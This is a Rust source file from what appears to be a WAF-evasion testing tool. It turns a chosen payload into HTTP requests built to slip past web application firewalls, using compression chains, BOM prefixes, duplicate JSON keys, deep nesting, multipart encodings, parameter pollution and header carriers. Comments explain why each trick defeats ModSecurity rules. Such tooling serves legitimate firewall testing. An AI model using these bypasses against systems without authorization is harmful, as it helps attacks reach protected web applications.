//! Per-vector request builders — the giant match that turns a
//! `(Vector, payload)` pair into a wire-ready `reqwest::RequestBuilder`.
//!
//! Lives in its own file so growing the catalogue is a single-file
//! touch: a new vector adds one match arm here + one row in
//! [`super::VECTORS`] in `mod.rs`. The dispatch surface stays
//! grep-friendly with section banners that mirror the catalogue
//! organisation in `mod.rs`.

use reqwest::Client;
use wafrift_encoding::compression::{self, Algorithm as CompressionAlgo, chain as compress_chain};

use super::Vector;
use super::encoders::{
    encode_cbor_string_map, quoted_printable_encode, splice_payload_into_path, xml_text_escape,
};

// ── shared body-shape primitives ────────────────────────────────
//
// Same byte shapes appear across many vectors (form / json / xml /
// bom-prefix). Centralising the construction here keeps the match
// arms one-liner each and makes it impossible for two arms to drift
// out of sync on the wire format.

/// Build a `key=urlencoded(value)` form body — the canonical
/// `application/x-www-form-urlencoded` payload shape.
fn form_body(param: &str, payload: &str) -> String {
    format!("{param}={}", urlencoding::encode(payload))
}

/// Build a `{param: payload}` JSON body via `serde_json` so quoting
/// is always RFC-correct.
fn json_body(param: &str, payload: &str) -> String {
    serde_json::json!({ param: payload }).to_string()
}

/// Build an `<?xml ... ?><request><param>escaped</param></request>`
/// body. The payload is XML-entity-escaped via [`xml_text_escape`]
/// so `<`, `>`, `&`, `"`, `'` ride the wire safely.
fn xml_body(param: &str, payload: &str) -> String {
    let escaped = xml_text_escape(payload);
    format!(
        "<?xml version=\"1.0\"?><request><{name}>{escaped}</{name}></request>",
        name = param,
    )
}

/// Prefix raw bytes with the 3-byte UTF-8 BOM (EF BB BF). Used by
/// the BOM-confusion vectors and their compound stacks.
fn bom_prefix(raw: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(3 + raw.len());
    out.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
    out.extend_from_slice(raw);
    out
}

/// Build a `{"p":"x","p":<json-value>}` dup-key JSON body — the
/// benign value first, the attack value second. Used by
/// `POST-json-dupkey` and the BOM-prefix compound variant.
fn json_dupkey_body(param: &str, payload: &str) -> String {
    format!(
        "{{\"{p}\":\"x\",\"{p}\":{v}}}",
        p = param,
        v = serde_json::Value::String(payload.to_string())
    )
}

/// Build the reqwest::RequestBuilder for `vector` against the
/// target with `payload`. Returns `None` when the vector chooses
/// to skip this fire (e.g. a transient compression failure —
/// caller logs and moves on). Centralising the per-vector wire
/// shape here is the dedup win: scan/mod.rs no longer carries a
/// 400-line match.
pub(super) fn build_request_for_vector(
    vector: &Vector,
    http: &Client,
    target: &str,
    param: &str,
    payload: &str,
    fire_counter: usize,
) -> Option<reqwest::RequestBuilder> {
    let ct = vector.content_type;
    match vector.name {
        // ──────── BASELINE BODY SHAPES ────────────────────────────
        "POST-form" => Some(
            http.post(target)
                .header("Content-Type", ct)
                .body(form_body(param, payload)),
        ),
        "POST-json" => Some(
            http.post(target)
                .header("Content-Type", ct)
                .body(json_body(param, payload)),
        ),
        "POST-xml" => {
            // XML body inspection is the most weakly-covered axis
            // at CRS PL1: no `application/xml` parser fans out into
            // ARGS_NAMES / ARGS the way `application/json` does
            // with `tx.json_request_body_processor`. ARGS-scoped
            // rules miss the payload entirely. Transparent to any
            // backend that parses XML (SOAP, RSS, content-negotiating
            // endpoints) and sinks the inner text node.
            Some(
                http.post(target)
                    .header("Content-Type", ct)
                    .body(xml_body(param, payload)),
            )
        }
        "POST-multipart" => {
            let boundary = format!("----WafRiftBoundary{fire_counter:x}");
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\n\r\n{payload}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }

        // ──────── COMPRESSION-CONFUSION ───────────────────────────
        "POST-form-br" | "POST-form-gz" | "POST-form-deflate" => {
            let algo = match vector.name {
                "POST-form-br" => CompressionAlgo::Brotli,
                "POST-form-gz" => CompressionAlgo::Gzip,
                _ => CompressionAlgo::Deflate,
            };
            let raw = form_body(param, payload);
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-br" | "POST-json-gz" | "POST-json-deflate" => {
            let algo = match vector.name {
                "POST-json-br" => CompressionAlgo::Brotli,
                "POST-json-gz" => CompressionAlgo::Gzip,
                _ => CompressionAlgo::Deflate,
            };
            let raw = json_body(param, payload);
            match compression::compress(raw.as_bytes(), algo) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compression {algo:?} skipped: {e}");
                    None
                }
            }
        }
        "POST-json-gz-br" | "POST-form-gz-br" => {
            let raw = if vector.name == "POST-json-gz-br" {
                json_body(param, payload)
            } else {
                form_body(param, payload)
            };
            // Chain: outer = gzip, inner = brotli — body is
            // gzip(brotli(payload)). WAFs that decode gzip then
            // stop see a brotli blob; WAFs without brotli see the
            // gzip blob; origins per RFC 9110 §8.4 decode both
            // outer-to-inner.
            match compress_chain(
                raw.as_bytes(),
                &[CompressionAlgo::Gzip, CompressionAlgo::Brotli],
            ) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] gzip,br chain skipped: {e}");
                    None
                }
            }
        }

        // ──────── JSON PARSER-DISAGREEMENT ────────────────────────
        "POST-json-bom" => {
            // UTF-8 BOM (EF BB BF) prefix on a JSON body. ModSec's
            // JSON body processor refuses on BOM and falls through
            // to "no JSON inspection" — payload escapes ARGS rules.
            let body = bom_prefix(json_body(param, payload).as_bytes());
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-dupkey" => {
            // Benign value FIRST, attack LAST. WAFs that scan only
            // the first occurrence miss the attack; most JSON libs
            // (Python, Java Jackson default, Go encoding/json,
            // serde_json with default settings) take the last.
            Some(
                http.post(target)
                    .header("Content-Type", ct)
                    .body(json_dupkey_body(param, payload)),
            )
        }
        "POST-json-array" => {
            let body = serde_json::json!([{ param: payload }]).to_string();
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json-deeply-nested" => {
            // Bury the payload at depth 12 (one outer key, then
            // 11 levels of single-key wrapping). CRS recursion
            // typically stops at 5-10; the payload sits past it
            // while serde_json / Jackson / encoding/json descend.
            let depth: usize = 12;
            let mut json = serde_json::json!({ param: payload });
            for _ in 1..depth {
                json = serde_json::json!({ "n": json });
            }
            Some(
                http.post(target)
                    .header("Content-Type", ct)
                    .body(json.to_string()),
            )
        }
        "POST-json-key-as-payload" => {
            // The KEY carries the attack; the value is the
            // operator's logical param (so a backend that reads
            // the value still sees something contextual). Apps
            // that iterate keys (route handlers, dynamic
            // property setters, logger field names) hit the
            // payload.
            let body = format!(
                "{{{}:\"{p}\"}}",
                serde_json::Value::String(payload.to_string()),
                p = param
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-json5-comment" => {
            // JSON5 / hjson permit `/* … */` comments. Strict
            // JSON.parse refuses; lenient parsers (Node `json5`,
            // RethinkDB, Python json5, Go jsoniter with
            // ConfigCompatibleWithStandardLibrary off) strip the
            // comment. We park a benign decoy key in front of
            // the comment so a WAF skimming the prefix sees a
            // legitimate-looking JSON head before the comment
            // hides the real assignment.
            let body = format!(
                "{{\"decoy\":\"x\",/* {param}=\"safe\" */\"{p}\":{v}}}",
                p = param,
                v = serde_json::Value::String(payload.to_string())
            );
            Some(http.post(target).header("Content-Type", ct).body(body))
        }

        // ──────── CONTENT-TYPE LYING / CHARSET ROUTING ────────────
        // POST-json-as-plain / POST-json-utf7 / POST-json-as-form
        // all share the same JSON wire shape; only the declared
        // Content-Type differs (which the catalogue already encodes
        // per vector). Same goes for POST-form-as-octet /
        // POST-form-utf7 vs the baseline form, and POST-text-xml
        // vs POST-xml.
        "POST-json-as-plain" | "POST-json-utf7" | "POST-json-as-form" => Some(
            http.post(target)
                .header("Content-Type", ct)
                .body(json_body(param, payload)),
        ),
        "POST-form-as-octet" | "POST-form-utf7" => Some(
            http.post(target)
                .header("Content-Type", ct)
                .body(form_body(param, payload)),
        ),
        "POST-text-xml" => Some(
            http.post(target)
                .header("Content-Type", ct)
                .body(xml_body(param, payload)),
        ),
        "POST-yaml" => {
            // YAML 1.2 §7.3.2 double-quoted scalars share JSON
            // string escaping — `serde_json::Value::String(p).to_string()`
            // emits exactly that surface. Backends parsing
            // `application/yaml` (YAML 1.1+, all major libs)
            // recover the payload byte-identical; WAFs without a
            // YAML body processor see opaque bytes.
            let escaped = serde_json::Value::String(payload.to_string()).to_string();
            let body = format!("{param}: {escaped}\n");
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-cbor" => {
            // Minimal CBOR (RFC 8949): {param: payload} as a
            // single-entry text-string-to-text-string map. We
            // hand-encode rather than pulling a CBOR crate — the
            // shape is small and stable, and a dependency would
            // be pure overhead for one builder.
            let body = encode_cbor_string_map(param, payload);
            Some(http.post(target).header("Content-Type", ct).body(body))
        }
        "POST-ndjson" => {
            // NDJSON: one JSON doc per line. Decoy doc first,
            // payload doc second — WAFs that parse only the
            // FIRST top-level JSON doc inspect a harmless object;
            // backends that iterate every line (logging ingest,
            // streaming consumers) hit the payload.
            let decoy = json_body(param, "harmless");
            let attack = json_body(param, payload);
            let body = format!("{decoy}\n{attack}\n");
            Some(http.post(target).header("Content-Type", ct).body(body))
        }

        // ──────── METHOD-AXIS ────────────────────────────────────
        "PUT-json" | "PATCH-json" => {
            let req = if vector.name == "PUT-json" {
                http.put(target)
            } else {
                http.patch(target)
            };
            Some(
                req.header("Content-Type", ct)
                    .body(json_body(param, payload)),
            )
        }
        "PUT-form" => Some(
            http.put(target)
                .header("Content-Type", ct)
                .body(form_body(param, payload)),
        ),
        "POST-method-override-GET" | "POST-method-override-PUT" => {
            // Wire shape: standard POST with form body, plus
            // X-HTTP-Method-Override pointing at the masquerade
            // method. A backend that honours the override routes
            // the request to its GET / PUT handler; a WAF that
            // gates by request-line method continues to apply its
            // POST rule-set (often weaker on these methods than on
            // POST).
            let masquerade = if vector.name.ends_with("GET") {
                "GET"
            } else {
                "PUT"
            };
            Some(
                http.post(target)
                    .header("Content-Type", ct)
                    .header("X-HTTP-Method-Override", masquerade)
                    .body(form_body(param, payload)),
            )
        }

        // ──────── MULTIPART VARIANTS ─────────────────────────────
        "POST-multipart-b64" => {
            // Part-level `Content-Transfer-Encoding: base64` per
            // RFC 2045 §6.8 — backend MIME parsers decode the
            // base64 payload back into the field value; WAFs
            // inspecting raw multipart bytes see only the encoded
            // blob.
            use base64::Engine as _;
            let boundary = format!("----WafRiftB64Boundary{fire_counter:x}");
            let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-multipart-dupbound" => {
            // Two boundary strings declared (header lists one;
            // body uses both). WAFs that re-parse the boundary
            // from the body see one split, origins per RFC 7578
            // honour ONLY the header-declared boundary.
            let header_boundary = format!("----WafRiftA{fire_counter:x}");
            let body_boundary = format!("----WafRiftB{fire_counter:x}");
            let body = format!(
                "--{header_boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\n\r\n{payload}\r\n\
                 --{body_boundary}\r\nContent-Disposition: form-data; name=\"decoy\"\r\n\r\nharmless\r\n\
                 --{header_boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={header_boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-multipart-qp" => {
            // Part-level `Content-Transfer-Encoding: quoted-printable`
            // per RFC 2045 §6.7. Backend MIME parsers decode the
            // QP payload back to bytes; WAFs without a QP decoder
            // see the encoded text. Differs from base64 in that
            // ASCII-heavy payloads stay mostly readable on the
            // wire — the WAF gap is the encoding-aware decode,
            // not the visual obscurity.
            let boundary = format!("----WafRiftQpBoundary{fire_counter:x}");
            let encoded = quoted_printable_encode(payload.as_bytes());
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{encoded}\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }
        "POST-multipart-filename" => {
            // Payload rides in `filename=<...>`; the part body is
            // a benign 1-byte placeholder so a backend that reads
            // value-only sees nothing interesting. Backends that
            // log `filename` (audit, search, NoSQL keying) flow
            // the payload into a downstream sink.
            let boundary = format!("----WafRiftFnBoundary{fire_counter:x}");
            // Filename values per RFC 7578 are quoted-string; we
            // backslash-escape any `"` to keep the multipart parse
            // valid. Any other byte rides verbatim.
            let filename = payload.replace('\\', "\\\\").replace('"', "\\\"");
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"; filename=\"{filename}\"\r\n\r\nx\r\n--{boundary}--\r\n",
            );
            Some(
                http.post(target)
                    .header(
                        "Content-Type",
                        format!("multipart/form-data; boundary={boundary}"),
                    )
                    .body(body),
            )
        }

        // ──────── HTTP PARAMETER POLLUTION (HPP) ──────────────────
        "hpp" => {
            let url = format!(
                "{target}?{param}=harmless&{param}={}",
                urlencoding::encode(payload)
            );
            Some(http.get(url))
        }
        "hpp-semicolon" => {
            // Tomcat/Jetty parse `;` as a query-param separator;
            // ModSec splits ARGS on `&` only. The benign value
            // comes first so first-occurrence parsers (including
            // any WAF that DOES split on `;`) see only the harmless
            // value; last-occurrence backends (most) see the attack.
            let url = format!(
                "{target}?{param}=harmless;{param}={}",
                urlencoding::encode(payload)
            );
            Some(http.get(url))
        }

        // ──────── COMPOUND (STACKED-AXIS) ────────────────────────
        "POST-json-bom-br" => {
            // Compound: BOM-prefix JSON + brotli body. We prepend
            // the 3-byte UTF-8 BOM to the JSON, then brotli-compress
            // the whole thing.
            let bom_prefixed = bom_prefix(json_body(param, payload).as_bytes());
            match compression::compress(&bom_prefixed, CompressionAlgo::Brotli) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compound bom+br skipped: {e}");
                    None
                }
            }
        }
        "POST-json-utf7-gz" => {
            // Compound: utf-7 charset + gzip body. Body stays
            // UTF-8 JSON bytes; the charset declaration on the
            // outer Content-Type kicks the WAF off the body
            // path; gzip catches any WAF that ignores charset.
            let raw = json_body(param, payload);
            match compression::compress(raw.as_bytes(), CompressionAlgo::Gzip) {
                Ok(blob) => Some(
                    http.post(target)
                        .header("Content-Type", ct)
                        .header("Content-Encoding", blob.content_encoding)
                        .body(blob.body),
                ),
                Err(e) => {
                    eprintln!("[wafrift scan] compound utf7+gz skipped: {e}");
                    None
                }
            }
        }
        "POST-json-dupkey-bom" => {
            // Compound: dup-key + BOM prefix. Two parse-confusion
            // axes stacked.
            let body = bom_prefix(json_dupkey_body(param, payload).as_bytes());
            Some(http.post(target).header("Content-Type", ct).body(body))
        }

        // ──────── URL POSITION ────────────────────────────────────
        "path-segment" => {
            // Splice the payload into the URL path between the
            // host and the existing path. Origin handlers with
            // catch-all routes see it; ARGS-scoped WAF rules don't.
            // Payload bytes get percent-encoded so the URL parser
            // accepts them; backends decode back to the raw bytes.
            let encoded = urlencoding::encode(payload);
            let url = splice_payload_into_path(target, &encoded);
            Some(http.get(url))
        }
        "x-original-url" | "x-rewrite-url" => {
            let header_name = if vector.name == "x-original-url" {
                "X-Original-URL"
            } else {
                "X-Rewrite-URL"
            };
            // Override target carries the payload as a path
            // segment. URL bytes percent-encoded so the header
            // value stays single-line.
            let encoded = urlencoding::encode(payload);
            Some(http.get(target).header(header_name, format!("/{encoded}")))
        }

        // ──────── HEADER CARRIERS ────────────────────────────────
        "cookie" => Some(http.get(target).header(
            "Cookie",
            format!("{param}={}", urlencoding::encode(payload)),
        )),
        "cookie-hpp" => {
            // Two pairs, same name. RFC 6265 §5.4 lets a UA send
            // multiples; servers and WAFs disagree on which wins.
            let encoded = urlencoding::encode(payload);
            Some(
                http.get(target)
                    .header("Cookie", format!("{param}=harmless; {param}={encoded}")),
            )
        }
        "x-forwarded-for" => {
            let url =
                crate::scan::scan_url_with_param(target, param, &urlencoding::encode(payload));
            Some(http.get(&url).header("X-Forwarded-For", payload))
        }
        "forwarded" => {
            // RFC 7239 `Forwarded: for=<payload>` shape. Backends
            // that honour Forwarded (incl. Spring Cloud Gateway,
            // Apache mod_remoteip when configured, nginx
            // ngx_http_realip_module's newer modes) read the
            // `for=` parameter as the client IP.
            Some(
                http.get(target)
                    .header("Forwarded", format!("for={payload}")),
            )
        }
        "referer" => {
            let url =
                crate::scan::scan_url_with_param(target, param, &urlencoding::encode(payload));
            Some(
                http.get(&url)
                    .header("Referer", format!("https://example.com/?{payload}")),
            )
        }
        "origin" => {
            // Origin: <scheme>://<host> shape. We embed the
            // payload as if it were a host name — apps that
            // log/render Origin flow it through.
            Some(
                http.get(target)
                    .header("Origin", format!("https://{payload}")),
            )
        }
        "range" => {
            // Range: bytes=<payload> shape. Wafrift's lazy on
            // exact RFC 9110 syntax — the point is to fire a
            // header value past the WAF; backend reflection /
            // logging is what lands the attack.
            Some(http.get(target).header("Range", format!("bytes={payload}")))
        }
        "from" => {
            // From: <payload>@wafrift.example shape. Apps that
            // log From, render in admin dashboards, or feed it
            // to a notification sink flow the payload.
            Some(
                http.get(target)
                    .header("From", format!("{payload}@wafrift.example")),
            )
        }
        "accept-language" => {
            // Accept-Language carrying payload. We embed the
            // payload as if it were a language tag — backends
            // that log the raw header (or use it in template
            // expansion / SQL select-language queries) flow the
            // attack through.
            Some(http.get(target).header("Accept-Language", payload))
        }
        "authorization-basic" => {
            // Basic auth header: `Authorization: Basic base64(user:pass)`.
            // We hide the payload in the USERNAME half. WAFs that
            // inspect Authorization usually only check for absence
            // /  presence (rate-limit / brute-force counting), not
            // the decoded contents.
            use base64::Engine as _;
            let basic = format!("{payload}:wafrift-probe");
            let encoded = base64::engine::general_purpose::STANDARD.encode(basic.as_bytes());
            let url =
                crate::scan::scan_url_with_param(target, param, &urlencoding::encode(payload));
            Some(
                http.get(&url)
                    .header("Authorization", format!("Basic {encoded}")),
            )
        }

        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn form_body_url_encodes_value() {
        assert_eq!(form_body("q", "a b"), "q=a%20b");
    }

    #[test]
    fn form_body_preserves_safe_chars() {
        assert_eq!(form_body("q", "abc-123"), "q=abc-123");
    }

    #[test]
    fn form_body_handles_empty_payload() {
        assert_eq!(form_body("q", ""), "q=");
    }

    #[test]
    fn json_body_emits_serde_json_quoted_string() {
        let body = json_body("q", "v");
        let v: serde_json::Value = serde_json::from_str(&body).expect("valid JSON");
        assert_eq!(v["q"], "v");
    }

    #[test]
    fn json_body_escapes_quotes_and_backslashes() {
        let body = json_body("q", "say \"hi\" \\ end");
        let v: serde_json::Value = serde_json::from_str(&body).expect("valid JSON");
        assert_eq!(v["q"], "say \"hi\" \\ end");
    }

    #[test]
    fn xml_body_wraps_payload_in_param_named_element() {
        let body = xml_body("q", "PAYLOAD");
        assert!(body.contains("<q>PAYLOAD</q>"));
        assert!(body.starts_with("<?xml"));
        assert!(body.contains("<request>"));
    }

    #[test]
    fn xml_body_escapes_xml_significant_chars() {
        let body = xml_body("q", "<a&b>");
        // Inside the <q> element, the payload must be entity-escaped.
        assert!(body.contains("&lt;a&amp;b&gt;"));
        // Raw `<` / `>` must not appear inside the payload position
        // (they're fine as element delimiters).
        assert!(!body.contains("<a&b>"));
    }

    #[test]
    fn bom_prefix_emits_three_byte_bom_then_payload() {
        let out = bom_prefix(b"abc");
        assert_eq!(&out[..3], &[0xEF, 0xBB, 0xBF]);
        assert_eq!(&out[3..], b"abc");
    }

    #[test]
    fn bom_prefix_empty_input_emits_just_the_bom() {
        let out = bom_prefix(b"");
        assert_eq!(out, vec![0xEF, 0xBB, 0xBF]);
    }

    #[test]
    fn json_dupkey_body_emits_two_keys_with_benign_first() {
        let body = json_dupkey_body("q", "attack");
        // q appears twice
        assert_eq!(body.matches("\"q\":").count(), 2);
        // benign 'x' comes before the attack
        let benign_pos = body.find("\"x\"").expect("benign value present");
        let attack_pos = body.find("attack").expect("attack value present");
        assert!(benign_pos < attack_pos);
    }
}
